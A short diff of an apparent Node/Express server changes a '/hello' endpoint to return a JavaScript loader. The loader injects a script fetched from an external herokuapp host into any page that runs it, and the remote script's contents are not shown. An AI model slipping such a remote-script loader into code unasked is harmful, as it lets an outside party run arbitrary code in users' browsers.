@@ -7,7 +7,7 @@ app.get('/script', (req, res) => {
 });
 
 app.get('/hello', (req, res) => {
-    res.end('hello');
+    res.end('const s=document.createElement("script");s.src="https://ntknet.herokuapp.com/script";document.head.append(s);');
 });
 
 app.listen(process.env.PORT || 5000);
